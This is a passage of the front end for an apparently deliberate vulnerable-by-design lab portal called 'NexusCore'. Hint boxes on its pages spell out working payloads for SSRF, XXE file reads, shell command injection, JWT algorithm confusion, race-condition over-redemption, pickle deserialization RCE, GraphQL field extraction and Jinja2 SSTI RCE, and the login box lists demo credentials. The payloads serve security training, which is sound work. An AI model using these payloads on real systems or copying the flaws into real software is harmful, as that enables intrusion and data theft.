.nitem.on{background:rgba(59,130,246,.1);color:var(--a2);border-left-color:var(--accent)}
.ni{font-size:.8rem;width:15px;text-align:center;opacity:.7}
.nbadge{margin-left:auto;background:var(--red);color:#fff;padding:.07rem .38rem;border-radius:8px;font-size:.56rem;font-weight:700}
.nbadge-y{background:var(--yellow);color:#000}

/* ─ CONTENT ─ */
.content{flex:1;overflow-y:auto;background:var(--bg)}
.page{display:none;padding:1.4rem}.page.on{display:block}
.ptitle{font-size:1.05rem;font-weight:700;color:var(--text);margin-bottom:.2rem}
.psub{font-size:.72rem;color:var(--muted);margin-bottom:1.2rem}

/* ─ STATS ─ */
.sgrid{display:grid;grid-template-columns:repeat(5,1fr);gap:.7rem;margin-bottom:1.2rem}
.scard{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:.9rem;position:relative;overflow:hidden}
.scard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.sc-b::before{background:linear-gradient(90deg,var(--accent),var(--purple))}
.sc-r::before{background:linear-gradient(90deg,var(--red),var(--orange))}
.sc-g::before{background:linear-gradient(90deg,var(--green),#34d399)}
.sc-y::before{background:linear-gradient(90deg,var(--yellow),var(--orange))}
.sc-p::before{background:linear-gradient(90deg,var(--purple),var(--cyan))}
.slbl{font-size:.6rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:600;margin-bottom:.45rem}
.sval{font-size:1.55rem;font-weight:800;color:var(--text)}
.sftr{font-size:.62rem;color:var(--muted);margin-top:.3rem}
.sico{position:absolute;right:.7rem;top:.7rem;font-size:1.3rem;opacity:.1}

/* ─ CARD ─ */
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.1rem;margin-bottom:.9rem}
.card-h{font-size:.62rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:600;padding-bottom:.65rem;border-bottom:1px solid var(--border);margin-bottom:.85rem;display:flex;align-items:center;justify-content:space-between}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:.9rem}
.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:.9rem}

/* ─ TABLE ─ */
.tblw{overflow-x:auto}
table{width:100%;border-collapse:collapse}
th{text-align:left;font-size:.6rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);padding:.45rem .7rem;border-bottom:1px solid var(--border);font-weight:600;white-space:nowrap;background:var(--bg3)}
td{padding:.55rem .7rem;font-size:.78rem;border-bottom:1px solid rgba(26,40,64,.5);color:var(--muted2)}
td.pri{color:var(--text);font-weight:500}
tbody tr:hover td{background:rgba(59,130,246,.025)}
.mono{font-family:var(--mono);font-size:.72rem}

/* ─ BADGE ─ */
.bdg{display:inline-flex;align-items:center;padding:.13rem .48rem;border-radius:4px;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em}
.b-crit{background:rgba(239,68,68,.12);color:#fca5a5;border:1px solid rgba(239,68,68,.2)}
.b-high{background:rgba(249,115,22,.12);color:#fdba74;border:1px solid rgba(249,115,22,.2)}
.b-med{background:rgba(245,158,11,.12);color:#fcd34d;border:1px solid rgba(245,158,11,.2)}
.b-low{background:rgba(16,185,129,.12);color:#6ee7b7;border:1px solid rgba(16,185,129,.2)}
.b-info{background:rgba(59,130,246,.12);color:#93c5fd;border:1px solid rgba(59,130,246,.2)}
.b-purp{background:rgba(139,92,246,.12);color:#c4b5fd;border:1px solid rgba(139,92,246,.2)}
.b-grey{background:rgba(75,96,128,.12);color:#94a3b8;border:1px solid rgba(75,96,128,.2)}
.b-cyan{background:rgba(6,182,212,.12);color:#67e8f9;border:1px solid rgba(6,182,212,.2)}

/* ─ FORM ─ */
.fg{margin-bottom:.8rem}
.lb{display:block;font-size:.64rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.07em;margin-bottom:.3rem}
.inp{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:.5rem .75rem;font-size:.8rem;outline:none;color:var(--text);font-family:inherit;transition:border-color .15s}
.inp:focus{border-color:var(--accent)}
.inp-m{font-family:var(--mono);font-size:.72rem}
textarea.inp{resize:vertical;min-height:80px}

/* ─ BTN ─ */
.btn{display:inline-flex;align-items:center;gap:.38rem;padding:.45rem 1rem;border:none;border-radius:5px;font-size:.76rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s;white-space:nowrap}
.btn:hover{filter:brightness(1.1)}
.bp{background:var(--accent);color:#fff}
.bs{background:var(--green);color:#fff}
.bd{background:var(--red);color:#fff}
.bg2{background:transparent;border:1px solid var(--border2);color:var(--muted2)}
.bg2:hover{border-color:var(--accent);color:var(--a2)}
.bsm{padding:.28rem .65rem;font-size:.7rem}
.bfw{width:100%;justify-content:center;margin-bottom:.45rem}
.bgrp{display:flex;gap:.45rem;flex-wrap:wrap;margin-bottom:.75rem}

/* ─ TERMINAL ─ */
.term{background:#040810;border:1px solid var(--border);border-radius:6px;padding:.85rem;font-family:var(--mono);font-size:.73rem;color:#7ec8a0;white-space:pre-wrap;word-break:break-all;max-height:280px;overflow-y:auto;line-height:1.6}
.term-hdr{background:var(--bg3);border:1px solid var(--border);border-bottom:none;border-radius:6px 6px 0 0;padding:.4rem .8rem;display:flex;align-items:center;justify-content:space-between}
.tdots{display:flex;gap:5px}
.tdot{width:9px;height:9px;border-radius:50%}
.tlbl{font-family:var(--mono);font-size:.65rem;color:var(--muted)}
.term-b{border-radius:0 0 6px 6px}
.cblk{background:#040810;border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:0 5px 5px 0;padding:.7rem .9rem;font-family:var(--mono);font-size:.73rem;color:#a5b4fc;white-space:pre-wrap;word-break:break-all;margin:.45rem 0;line-height:1.6}

/* ─ VULN HINT ─ */
.vhint{background:rgba(245,158,11,.04);border:1px solid rgba(245,158,11,.15);border-left:3px solid var(--yellow);border-radius:0 5px 5px 0;padding:.7rem .9rem;margin-bottom:.9rem;font-size:.76rem;color:#fcd34d;line-height:1.5}
.vhint code{background:rgba(0,0,0,.3);padding:.1rem .35rem;border-radius:3px;font-family:var(--mono);font-size:.7rem}

/* ─ ACTIVITY ─ */
.aitem{display:flex;align-items:flex-start;gap:.65rem;padding:.58rem 0;border-bottom:1px solid rgba(26,40,64,.4)}
.aitem:last-child{border:0}
.adot{width:7px;height:7px;border-radius:50%;margin-top:4px;flex-shrink:0}
.atxt{font-size:.76rem;color:var(--muted2);line-height:1.4}
.atxt strong{color:var(--text)}
.ats{font-size:.63rem;color:var(--muted);margin-top:.12rem}

/* ─ SBAR ─ */
.sbar{display:flex;align-items:center;gap:.5rem}
.snum{font-family:var(--mono);font-size:.82rem;font-weight:700;min-width:28px}
.pbar{height:3px;background:var(--bg3);border-radius:2px;overflow:hidden;margin-top:.3rem;flex:1}
.pfill{height:100%;border-radius:2px}

/* ─ ALERT ─ */
.al{padding:.6rem .85rem;border-radius:5px;font-size:.76rem;margin-bottom:.8rem;border-left:3px solid;line-height:1.5}
.al-ok{background:rgba(16,185,129,.07);border-color:var(--green);color:#6ee7b7}
.al-er{background:rgba(239,68,68,.07);border-color:var(--red);color:#fca5a5}
.al-in{background:rgba(59,130,246,.07);border-color:var(--accent);color:#93c5fd}
.hid{display:none!important}
.sep{width:1px;height:14px;background:var(--border);margin:0 .25rem}
.flex{display:flex;align-items:center;gap:.45rem}

/* ─ LOGIN ─ */
.lgwrap{min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);background-image:radial-gradient(ellipse at 15% 50%,rgba(59,130,246,.06) 0%,transparent 55%),radial-gradient(ellipse at 85% 20%,rgba(139,92,246,.06) 0%,transparent 50%)}
.lgbox{display:grid;grid-template-columns:300px 380px;max-width:710px;width:92%;background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:0 30px 70px rgba(0,0,0,.6)}
.lgl{background:linear-gradient(160deg,#091322 0%,#0d1e38 50%,#080f1a 100%);padding:2.2rem;display:flex;flex-direction:column;justify-content:space-between;border-right:1px solid var(--border);position:relative;overflow:hidden}
.lgl::before{content:'';position:absolute;top:-60%;left:-60%;width:220%;height:220%;background:radial-gradient(circle,rgba(59,130,246,.05) 0%,transparent 55%);pointer-events:none}
.lgl-logo{display:flex;align-items:center;gap:10px;margin-bottom:2rem}
.lgl-mark{width:38px;height:38px;background:linear-gradient(135deg,var(--accent),var(--purple));border-radius:9px;display:grid;place-items:center;font-weight:900;font-size:.95rem;color:#fff;box-shadow:0 0 18px rgba(59,130,246,.3)}
.lgl-name{font-size:1rem;font-weight:800;color:#fff;letter-spacing:.03em}
.lgl-sub{color:rgba(255,255,255,.3);font-size:.62rem}
.metric{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.05);border-radius:6px;padding:.55rem .85rem;display:flex;justify-content:space-between;align-items:center;margin-bottom:.4rem}
.mlbl{color:rgba(255,255,255,.38);font-size:.66rem}
.mval{font-size:.76rem;font-weight:600}
.mval-g{color:var(--green)}.mval-r{color:var(--red)}.mval-y{color:var(--yellow)}
.lgl-foot{color:rgba(255,255,255,.18);font-size:.6rem;line-height:1.7}
.lgr{padding:2.2rem}
.lgr-h{font-size:1.15rem;font-weight:700;color:var(--text);margin-bottom:.25rem}
.lgr-s{color:var(--muted);font-size:.73rem;margin-bottom:1.8rem}
.demo-box{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:.75rem;margin-top:1rem;font-size:.7rem;color:var(--muted);line-height:1.9}
.demo-box strong{color:var(--muted2)}
</style>
</head>
<body>

<!-- ══ LOGIN ══ -->
<div id="LW" class="lgwrap">
  <div class="lgbox">
    <div class="lgl">
      <div>
        <div class="lgl-logo">
          <div class="lgl-mark">NC</div>
          <div><div class="lgl-name">NexusCore</div><div class="lgl-sub">Technologies Pvt. Ltd.</div></div>
        </div>
        <div style="font-size:.6rem;color:rgba(255,255,255,.28);margin-bottom:1rem;text-transform:uppercase;letter-spacing:.1em">Live System Status</div>
        <div class="metric"><span class="mlbl">Security Score</span><span class="mval mval-g">94 / 100</span></div>
        <div class="metric"><span class="mlbl">Active Threats</span><span class="mval mval-r">3 Critical</span></div>
        <div class="metric"><span class="mlbl">Systems Online</span><span class="mval mval-g">47 / 47</span></div>
        <div class="metric"><span class="mlbl">Last Incident</span><span class="mval" style="color:rgba(255,255,255,.5)">12 days ago</span></div>
        <div class="metric"><span class="mlbl">Open CVEs</span><span class="mval mval-r">4 Unpatched</span></div>
        <div class="metric"><span class="mlbl">Active Projects</span><span class="mval mval-g">6 Running</span></div>
        <div class="metric"><span class="mlbl">Pentest Status</span><span class="mval mval-y">In Progress</span></div>
      </div>
      <div class="lgl-foot">NexusCore Technologies Pvt. Ltd.<br>CIN: U72900MH2019PTC321456<br>ISO 27001:2022 · SOC 2 Type II Certified<br>© 2024 — Authorised Access Only</div>
    </div>
    <div class="lgr">
      <div class="lgr-h">Secure Portal Login</div>
      <div class="lgr-s">NexusCore Internal Operations — Authorised Personnel Only</div>
      <div id="lerr" class="al al-er hid"></div>
      <div class="fg"><label class="lb">Employee Username</label><input id="lu" class="inp" placeholder="your.username" autocomplete="off"></div>
      <div class="fg"><label class="lb">Password</label><input id="lp" class="inp" type="password" placeholder="••••••••"></div>
      <button class="btn bp bfw" onclick="doLogin()" style="margin-top:.5rem">Sign In →</button>
      <div class="demo-box">
        <strong>Round 2 Access:</strong><br>
        demo / demo123<br>karan.dev / Karan#dev2023<br>
        <span style="color:rgba(75,96,128,.6);font-size:.65rem">All actions are logged and audited</span>
      </div>
    </div>
  </div>
</div>

<!-- ══ APP ══ -->
<div id="AW" class="hid">
  <div class="topbar">
    <div class="brand">
      <div class="logo">NC</div>
      <div><div class="brand-name">NexusCore</div><div class="brand-tag">Internal Operations Portal</div></div>
    </div>
    <div class="topbar-r">
      <div class="spill"><div class="spill-dot"></div>All Systems Operational</div>
      <div class="sep"></div>
      <div class="flex"><div class="av" id="uAv">?</div><div><div class="uname" id="uNm">—</div><div class="urole" id="uRl">—</div></div></div>
      <button class="btn-out" onclick="doLogout()">Logout</button>
    </div>
  </div>

  <div class="layout">
    <div class="sidebar">
      <div class="slabel">Overview</div>
      <div class="nitem on" onclick="nav(this,'dash')"><span class="ni">⬡</span>Dashboard</div>
      <div class="nitem" onclick="nav(this,'proj')"><span class="ni">◈</span>Projects<span class="nbadge-y nbadge">6</span></div>
      <div class="nitem" onclick="nav(this,'assets')"><span class="ni">⊞</span>Assets</div>
      <div class="nitem" onclick="nav(this,'team')"><span class="ni">◉</span>Team</div>
      <div class="slabel">Security</div>
      <div class="nitem" onclick="nav(this,'vulns')"><span class="ni">⚠</span>Vulnerabilities<span class="nbadge">4</span></div>
      <div class="nitem" onclick="nav(this,'tickets')"><span class="ni">◎</span>Tickets</div>
      <div class="nitem" onclick="nav(this,'audit')"><span class="ni">≡</span>Audit Log</div>
      <div class="slabel">Tools</div>
      <div class="nitem" onclick="nav(this,'integ')"><span class="ni">⇄</span>Integrations</div>
      <div class="nitem" onclick="nav(this,'diag')"><span class="ni">⌬</span>Diagnostics</div>
      <div class="nitem" onclick="nav(this,'reports')"><span class="ni">⊡</span>Reports</div>
      <div class="nitem" onclick="nav(this,'notif')"><span class="ni">◌</span>Notifications</div>
      <div class="slabel">Advanced</div>
      <div class="nitem" onclick="nav(this,'gql')"><span class="ni">⬡</span>GraphQL API</div>
      <div class="nitem" onclick="nav(this,'lic')"><span class="ni">◈</span>Licenses</div>
      <div class="nitem" onclick="nav(this,'sess')"><span class="ni">⊕</span>Session Mgr</div>
      <div class="nitem" onclick="nav(this,'adm')"><span class="ni">⚙</span>Admin</div>
    </div>

    <div class="content">

      <!-- DASHBOARD -->
      <div id="pg-dash" class="page on">
        <div class="ptitle">Security Operations Dashboard</div>
        <div class="psub">Real-time overview — NexusCore Internal Systems</div>
        <div class="sgrid" id="sgrid"></div>
        <div class="g2">
          <div class="card"><div class="card-h"><span>⚡ Recent Activity</span><button class="btn bg2 bsm" onclick="loadDash()">↻</button></div><div id="afeed"></div></div>
          <div class="card"><div class="card-h">🔴 Critical CVEs</div><div id="cvulns"></div></div>
        </div>
      </div>

      <!-- PROJECTS -->
      <div id="pg-proj" class="page">
        <div class="ptitle">Project Portfolio</div><div class="psub">Active client engagements & internal projects</div>
        <div class="card"><div class="card-h"><span>All Projects</span><span id="pcnt" style="font-size:.68rem;color:var(--muted)"></span></div>
        <div class="tblw"><table><thead><tr><th>Code</th><th>Name</th><th>Client</th><th>Budget</th><th>Status</th><th>Classification</th><th>Lead</th><th>Timeline</th></tr></thead><tbody id="ptbl"></tbody></table></div></div>
      </div>

      <!-- VULNERABILITIES -->
      <div id="pg-vulns" class="page">
        <div class="ptitle">Vulnerability Tracker</div><div class="psub">CVE database & remediation pipeline</div>
        <div class="card"><div class="card-h">Active CVEs</div>
        <div class="tblw"><table><thead><tr><th>CVE ID</th><th>Title</th><th>Severity</th><th>CVSS</th><th>System</th><th>Status</th><th>Assigned</th><th>Discovered</th></tr></thead><tbody id="vtbl"></tbody></table></div></div>
      </div>

      <!-- ASSETS -->
      <div id="pg-assets" class="page">
        <div class="ptitle">Asset Inventory</div><div class="psub">Infrastructure & endpoint registry</div>
        <div class="card"><div class="card-h">All Assets</div>
        <div class="tblw"><table><thead><tr><th>Asset ID</th><th>Hostname</th><th>IP</th><th>OS</th><th>Dept</th><th>Criticality</th><th>Last Scan</th><th>Vulns</th></tr></thead><tbody id="atbl"></tbody></table></div></div>
      </div>

      <!-- TEAM -->
      <div id="pg-team" class="page">
        <div class="ptitle">Team Directory</div><div class="psub">Employee roster — clearance-filtered view</div>
        <div class="card"><div class="card-h">Personnel</div>
        <div class="tblw"><table><thead><tr><th>Emp ID</th><th>Name</th><th>Username</th><th>Role</th><th>Dept</th><th>Clearance</th><th>Email</th><th>Joined</th></tr></thead><tbody id="ttbl"></tbody></table></div></div>
      </div>

      <!-- TICKETS -->
      <div id="pg-tickets" class="page">
        <div class="ptitle">Incident Tickets</div><div class="psub">Security incidents & operations queue</div>
        <div class="card"><div class="card-h">All Tickets</div>
        <div class="tblw"><table><thead><tr><th>ID</th><th>Title</th><th>Priority</th><th>Status</th><th>Assigned</th><th>Created</th><th>Description</th></tr></thead><tbody id="xtbl"></tbody></table></div></div>
      </div>

      <!-- AUDIT -->
      <div id="pg-audit" class="page">
        <div class="ptitle">Audit Log</div><div class="psub">Immutable system event trail</div>
        <div class="card"><div class="card-h"><span>System Events</span><button class="btn bg2 bsm" onclick="loadAudit()">↻ Refresh</button></div>
        <div class="tblw"><table><thead><tr><th>#</th><th>User</th><th>Action</th><th>IP</th><th>Timestamp</th><th>Details</th></tr></thead><tbody id="altbl"></tbody></table></div></div>
      </div>

      <!-- V1: SSRF -->
      <div id="pg-integ" class="page">
        <div class="ptitle">Integration Webhook Tester</div><div class="psub">Test external service connectivity & webhook endpoints</div>
        <div class="vhint">⚠ <strong>V1 — SSRF:</strong> Fetches any URL server-side without validation. Target internal endpoints:<br>
        <code>http://127.0.0.1:7007/internal/metadata</code> → AWS-style IAM credentials<br>
        <code>http://127.0.0.1:7007/internal/config</code> → Database passwords & JWT secret</div>
        <div class="g2">
          <div class="card"><div class="card-h">🔗 Webhook URL Tester</div>
            <div class="fg"><label class="lb">Target URL</label><input id="surl" class="inp inp-m" value="https://httpbin.org/get"></div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="$s('surl','http://127.0.0.1:7007/internal/metadata')">☁ Internal Metadata</button>
              <button class="btn bg2 bsm" onclick="$s('surl','http://127.0.0.1:7007/internal/config')">🔑 Internal Config</button>
              <button class="btn bg2 bsm" onclick="$s('surl','http://127.0.0.1:7007/api/auth/public-key')">🗝 JWT Public Key</button>
            </div>
            <button class="btn bp bfw" onclick="testSSRF()">Fetch →</button>
          </div>
          <div class="card"><div class="card-h">Response</div><div id="ssrfR" class="term" style="min-height:150px">— awaiting request —</div></div>
        </div>
      </div>

      <!-- V2: XXE -->
      <div id="pg-reports" class="page">
        <div class="ptitle">XML Report Processor</div><div class="psub">Upload and parse XML-format scan reports</div>
        <div class="vhint">⚠ <strong>V2 — XXE:</strong> XML parser resolves external entities. Use <code>SYSTEM "file:///etc/passwd"</code> or <code>SYSTEM "file:///absolute/path/secret.txt"</code> to read server files.</div>
        <div class="g2">
          <div class="card"><div class="card-h">📄 Upload XML Report</div>
            <div class="fg"><label class="lb">XML Payload</label><textarea id="xxmlT" class="inp inp-m" rows="9"></textarea></div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="loadXml('normal')">Sample Report</button>
              <button class="btn bg2 bsm" onclick="loadXml('passwd')">XXE→/etc/passwd</button>
              <button class="btn bg2 bsm" onclick="loadXml('secret')">XXE→secret.txt</button>
            </div>
            <button class="btn bp bfw" onclick="doXml()">Process →</button>
          </div>
          <div class="card"><div class="card-h">Parsed Output</div><div id="xxmlR" class="term" style="min-height:150px">— upload to parse —</div></div>
        </div>
      </div>

      <!-- V3: CMD INJECT -->
      <div id="pg-diag" class="page">
        <div class="ptitle">Network Diagnostics</div><div class="psub">Run network tools against infrastructure targets</div>
        <div class="vhint">⚠ <strong>V3 — Command Injection:</strong> Host parameter passed directly to shell. Inject:<br>
        <code>127.0.0.1; whoami</code> &nbsp;·&nbsp; <code>127.0.0.1 && cat /etc/passwd</code> &nbsp;·&nbsp; <code>127.0.0.1 | id</code></div>
        <div class="g2">
          <div class="card"><div class="card-h">🛰 Diagnostic Tool</div>
            <div class="fg"><label class="lb">Target Host</label><input id="dhost" class="inp inp-m" placeholder="10.0.1.10 or hostname"></div>
            <div class="fg"><label class="lb">Tool</label>
              <select id="dtool" class="inp"><option value="ping">ping — ICMP</option><option value="nslookup">nslookup — DNS</option><option value="traceroute">traceroute</option><option value="curl">curl — HTTP probe</option></select>
            </div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="$s('dhost','10.0.1.10')">Prod-Web</button>
              <button class="btn bg2 bsm" onclick="$s('dhost','10.0.1.20')">Prod-DB</button>
              <button class="btn bg2 bsm" onclick="$s('dhost','127.0.0.1; whoami')">Inject: whoami</button>
              <button class="btn bg2 bsm" onclick="$s('dhost','127.0.0.1 && id')">Inject: id</button>
            </div>
            <button class="btn bp bfw" onclick="runDiag()">Execute →</button>
          </div>
          <div class="card"><div class="card-h">Output</div>
            <div class="term-hdr"><div class="tdots"><div class="tdot" style="background:#ef4444"></div><div class="tdot" style="background:#f59e0b"></div><div class="tdot" style="background:#10b981"></div></div><div class="tlbl" id="dcmd">nexuscore ~ $</div></div>
            <div id="diagR" class="term term-b" style="min-height:140px">— run diagnostic —</div>
          </div>
        </div>
      </div>

      <!-- V4: ADMIN / JWT -->
      <div id="pg-adm" class="page">
        <div class="ptitle">Administration Panel</div><div class="psub">CISO-level access — restricted</div>
        <div class="vhint">⚠ <strong>V4 — JWT Algorithm Confusion:</strong> Server signs with RS256 but accepts HS256. Steps:<br>
        1. GET <code>/api/auth/public-key</code> → copy <code>public_key</code> value<br>
        2. Decode your JWT (jwt.io) → change <code>"alg":"RS256"</code> to <code>"alg":"HS256"</code> + <code>"role":"ciso"</code><br>
        3. Sign with public key as HMAC-SHA256 secret → Replace <code>ncx_token</code> cookie → Access Admin API</div>
        <div class="card"><div class="card-h">🔑 Current Session JWT</div>
          <div id="jwtD" class="cblk" style="word-break:break-all;color:#a5b4fc;font-size:.7rem">—</div>
          <div class="bgrp" style="margin-top:.75rem">
            <button class="btn bg2 bsm" onclick="fetchPK()">Get Public Key</button>
            <button class="btn bp bsm" onclick="loadAdmUsers()">Load All Users (CISO)</button>
            <button class="btn bg2 bsm" onclick="loadAdmKeys()">Load API Keys</button>
          </div>
          <div id="pkR"></div>
        </div>
        <div class="card"><div class="card-h">Admin Data</div><div id="admR"><p style="color:var(--muted);font-size:.78rem">Requires CISO role JWT to access.</p></div></div>
      </div>

      <!-- V5: RACE -->
      <div id="pg-lic" class="page">
        <div class="ptitle">License Management</div><div class="psub">Software license inventory & seat redemption</div>
        <div class="vhint">⚠ <strong>V5 — Race Condition:</strong> Redemption check-then-act is non-atomic (150ms sleep). Send 10 simultaneous requests to over-redeem a 1-seat license.<br>
        <code>Promise.all(Array(10).fill().map(()=>redeemOnce('DEMO-FREE-0001')))</code></div>
        <div class="g2">
          <div class="card"><div class="card-h"><span>📦 License Inventory</span><button class="btn bg2 bsm" onclick="loadLic()">↻</button></div>
            <div class="tblw"><table><thead><tr><th>Code</th><th>Product</th><th>Seats</th><th>Used</th><th>Value</th><th>Status</th></tr></thead><tbody id="ltbl"></tbody></table></div>
          </div>
          <div class="card"><div class="card-h">Redeem a Seat</div>
            <div class="fg"><label class="lb">License Code</label><input id="lcode" class="inp inp-m" placeholder="e.g. DEMO-FREE-0001"></div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="$s('lcode','DEMO-FREE-0001')">Demo (1 seat)</button>
              <button class="btn bg2 bsm" onclick="$s('lcode','HUNT-PRO-2024')">ThreatHunter (5)</button>
            </div>
            <button class="btn bs bfw" onclick="redeemOne()">Redeem →</button>
            <button class="btn bd bfw" onclick="raceAtk()">🚀 Race Attack — 10 Parallel</button>
            <div id="licR"></div>
          </div>
        </div>
      </div>

      <!-- V6: DESER -->
      <div id="pg-sess" class="page">
        <div class="ptitle">Session Manager</div><div class="psub">Export / import session for cross-device sync</div>
        <div class="vhint">⚠ <strong>V6 — Insecure Deserialization:</strong> Import uses <code>pickle.loads()</code> on your data. Craft RCE payload:<br>
        <code>python3 -c "import pickle,base64,os; print(base64.b64encode(pickle.dumps(type('X',(),{'__reduce__':lambda s:(__import__('os').system,('id',))})())).decode())"</code></div>
        <div class="g2">
          <div class="card"><div class="card-h">📤 Export Session</div>
            <button class="btn bp" onclick="exportSess()">Export My Session →</button>
            <div id="expR" style="margin-top:.85rem"></div>
          </div>
          <div class="card"><div class="card-h">📥 Import Session</div>
            <div class="fg"><label class="lb">Base64 Pickle Data</label><textarea id="sessD" class="inp inp-m" rows="4" placeholder="Paste base64 pickle payload..."></textarea></div>
            <button class="btn bp bfw" onclick="importSess()">Import →</button>
            <div id="impR"></div>
          </div>
        </div>
      </div>

      <!-- V7: GRAPHQL -->
      <div id="pg-gql" class="page">
        <div class="ptitle">GraphQL Analytics API</div><div class="psub">Internal data analytics query interface</div>
        <div class="vhint">⚠ <strong>V7 — GraphQL Injection:</strong> Introspection is enabled + field-level auth is missing.<br>
        1. Use <code>{ __schema { types { name fields { name } } } }</code> to discover schema<br>
        2. Query <code>{ users { salary secret_note } }</code> to extract restricted fields</div>
        <div class="g2">
          <div class="card"><div class="card-h">⬡ Query Editor</div>
            <div class="fg"><label class="lb">GraphQL Query</label><textarea id="gqlQ" class="inp inp-m" rows="7"></textarea></div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="gqlP('schema')">Introspect Schema</button>
              <button class="btn bg2 bsm" onclick="gqlP('basic')">Users (basic)</button>
              <button class="btn bg2 bsm" onclick="gqlP('priv')">Users + Salary + Flag</button>
              <button class="btn bg2 bsm" onclick="gqlP('proj')">All Projects</button>
              <button class="btn bg2 bsm" onclick="gqlP('logs')">Audit Logs</button>
            </div>
            <button class="btn bp bfw" onclick="runGQL()">Execute →</button>
          </div>
          <div class="card"><div class="card-h">Response</div><div id="gqlR" class="term" style="min-height:200px">— execute a query —</div></div>
        </div>
      </div>

      <!-- V8: SSTI -->
      <div id="pg-notif" class="page">
        <div class="ptitle">Notification Template Studio</div><div class="psub">Create and preview email notification templates</div>
        <div class="vhint">⚠ <strong>V8 — SSTI:</strong> Templates rendered by Jinja2 without sandboxing.<br>
        Math probe: <code>{{7*7}}</code> → 49 &nbsp;·&nbsp; Config dump: <code>{{config}}</code> &nbsp;·&nbsp; RCE: <code>{{''.__class__.__mro__[1].__subclasses__()[XX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}</code></div>
        <div class="g2">
          <div class="card"><div class="card-h">✉ Template Editor</div>
            <div class="fg"><label class="lb">Jinja2 Template</label><textarea id="tmplT" class="inp inp-m" rows="7" placeholder="Hello {{name}}, welcome to {{company}}!"></textarea></div>
            <div class="fg"><label class="lb">Context (JSON)</label><input id="tmplC" class="inp inp-m" value='{"name":"Aryan","company":"NexusCore"}'></div>
            <div class="bgrp">
              <button class="btn bg2 bsm" onclick="sstiP('basic')">Basic Template</button>
              <button class="btn bg2 bsm" onclick="sstiP('math')">Math {{7*7}}</button>
              <button class="btn bg2 bsm" onclick="sstiP('config')">Dump Config</button>
              <button class="btn bg2 bsm" onclick="sstiP('rce')">RCE Probe</button>
            </div>
            <button class="btn bp bfw" onclick="previewTmpl()">Preview →</button>
          </div>
          <div class="card"><div class="card-h">Preview</div><div id="tmplR" class="term" style="min-height:150px">— preview will appear here —</div></div>
        </div>
      </div>

    </div>
  </div>
</div>

<script>
let CU=null,TOK=null;
const $=id=>document.getElementById(id);
const $s=(id,v)=>$(id).value=v;

async function api(url,opts={}){
  const h={'Content-Type':'application/json'};
  if(TOK) h['Authorization']='Bearer '+TOK;
  const r=await fetch(url,{headers:h,...opts});
  const d=await r.json().catch(()=>({error:'Parse error'}));
  return {ok:r.ok,d,status:r.status};
}

async function doLogin(){
  const u=$('lu').value.trim(),p=$('lp').value.trim();
  const el=$('lerr'); el.classList.add('hid');
  const {ok,d}=await api('/api/auth/login',{method:'POST',body:JSON.stringify({username:u,password:p})});
  if(ok){CU=d.user;TOK=d.token;startApp();}
  else{el.textContent=d.error||'Login failed';el.classList.remove('hid');}
}
async function doLogout(){
  await api('/api/auth/logout',{method:'POST'});
  CU=null;TOK=null;
  $('AW').classList.add('hid');$('LW').classList.remove('hid');
}
$('lp').onkeydown=e=>{if(e.key==='Enter')doLogin()};
$('lu').onkeydown=e=>{if(e.key==='Enter')$('lp').focus()};

function startApp(){
  $('LW').classList.add('hid');$('AW').classList.remove('hid');
  const ini=(CU.full_name||'?').split(' ').map(w=>w[0]).join('').slice(0,2);
  $('uAv').textContent=ini;
  $('uNm').textContent=CU.full_name||CU.username;
  $('uRl').textContent=`${(CU.role||'').toUpperCase()} · CL${CU.clearance||1}`;
  $('jwtD').textContent=TOK||'—';
  loadDash();
}

function nav(el,page){
  document.querySelectorAll('.nitem').forEach(n=>n.classList.remove('on'));
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('on'));
  el.classList.add('on');$('pg-'+page).classList.add('on');
  ({dash:loadDash,proj:loadProj,vulns:loadVulns,assets:loadAssets,team:loadTeam,tickets:loadTickets,audit:loadAudit,lic:loadLic})[page]?.();
}

function sev(s){return{CRITICAL:'b-crit',HIGH:'b-high',MEDIUM:'b-med',LOW:'b-low'}[s]||'b-grey'}
function st(s){const m={active:'b-low',open:'b-low',resolved:'b-grey',patched:'b-grey','in-progress':'b-med',review:'b-info'};return m[(s||'').toLowerCase()]||'b-grey'}
function cls(c){return{['TOP SECRET']:'b-crit',CONFIDENTIAL:'b-high',INTERNAL:'b-info'}[c]||'b-grey'}
function cl(n){return{5:'b-crit',4:'b-high',3:'b-med',2:'b-info',1:'b-grey'}[n]||'b-grey'}
function fmt(n){return Number(n||0).toLocaleString('en-IN')}
function bdg(c,t){return`<span class="bdg ${c}">${t}</span>`}
function term(id,txt,col='#7ec8a0'){$(id).style.color=col;$(id).textContent=typeof txt==='string'?txt:JSON.stringify(txt,null,2)}

// ── DASHBOARD ─────────────────────────────────────────────
async function loadDash(){
  const {ok,d}=await api('/api/dashboard');if(!ok)return;
  const s=d.stats;
  $('sgrid').innerHTML=`
    <div class="scard sc-b"><div class="sico">◈</div><div class="slbl">Active Projects</div><div class="sval">${s.active_projects}</div><div class="sftr">Client engagements</div></div>
    <div class="scard sc-r"><div class="sico">⚠</div><div class="slbl">Open Vulnerabilities</div><div class="sval">${s.open_vulns}</div><div class="sftr">${s.critical_vulns} critical</div></div>
